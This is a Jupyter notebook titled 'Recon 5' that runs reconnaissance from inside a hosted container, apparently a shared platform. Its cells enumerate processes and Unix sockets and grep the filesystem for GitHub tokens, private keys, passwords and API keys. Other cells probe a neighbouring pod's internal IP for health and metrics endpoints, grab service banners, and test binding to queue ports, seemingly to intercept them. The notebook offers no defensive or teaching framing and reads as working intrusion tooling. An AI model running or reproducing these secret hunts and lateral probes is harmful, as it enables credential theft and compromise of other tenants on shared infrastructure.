# Recon 5
Neighbor pod, fileops IPC, secret hunting.

In [ ]:
import subprocess
def run(cmd, t=40):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

print(run("ls -la /proc/ | head -20; echo; for pid in $(ls /proc | grep -E '^[0-9]+$'); do cmd=$(tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null | head -c 120); echo \"$pid: $cmd\"; done", 20))
print(run("find / -type s 2>/dev/null | grep -v venv | head -30", 20))
print(run("ls -la /var/run/ /run/ 2>&1 | head -30; ls -la /var/run/vivid 2>&1; ls -la /tmp/*.sock /tmp/vivid-blender/*.sock 2>&1 | head", 15))

In [ ]:
import subprocess
def run(cmd, t=40):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

print(run("grep -rEl 'ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|oauth2|BEGIN (RSA|OPENSSH|EC) PRIVATE' /home /cloud /tmp /etc /opt/connect 2>/dev/null | head -20", 40))
print(run("grep -rEl 'password|secret|token|api[_-]?key' /cloud/persistent-state /home/connect /etc/connect 2>/dev/null | head", 20))
print(run("ls -la /etc/connect /etc/posit /srv 2>&1 | head -40; find /etc -maxdepth 2 -iname '*connect*' -o -maxdepth 2 -iname '*posit*' 2>/dev/null | head", 15))

In [ ]:
import subprocess
script = r'''
import urllib.request
def req(url, timeout=4):
    try:
        resp = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"}), timeout=timeout)
        body = resp.read(800)
        print(url, "->", resp.status, resp.headers.get("content-type"), body[:400])
    except Exception as e:
        print(url, "FAIL:", e)
ip = "192.168.4.118"
for path in ["/", "/health", "/metrics", "/status", "/queue", "/__/health", "/api", "/version"]:
    req("http://%s:8012%s" % (ip, path))
req("http://%s:9090/" % ip)
req("http://%s:9090/metrics" % ip)
req("http://%s:9090/health" % ip)
'''
p = subprocess.run(["python3", "-c", script], capture_output=True, timeout=120)
print(p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")[:3000])

In [ ]:
import subprocess
script = r'''
import socket, urllib.request
# try raw HTTP to our own localhost 9090 & neighbors, capture banner
def raw(ip, port, payload="GET / HTTP/1.0\r\nHost: x\r\n\r\n"):
    try:
        s = socket.create_connection((ip, port), timeout=3)
        s.send(payload.encode())
        data = s.recv(2000)
        print(ip, port, repr(data[:500]))
        s.close()
    except Exception as e:
        print(ip, port, "FAIL:", e)
raw("127.0.0.1", 9090)
raw("127.0.0.1", 8012)
raw("192.168.4.118", 9090)
raw("192.168.4.118", 8012)
# listen test on queue ports
for port in [8012, 8112, 9090]:
    try:
        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port)); s.listen(1)
        print("we can bind", port); s.close()
    except Exception as e:
        print("cannot bind", port, e)
'''
p = subprocess.run(["python3", "-c", script], capture_output=True, timeout=90)
print(p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")[:3000])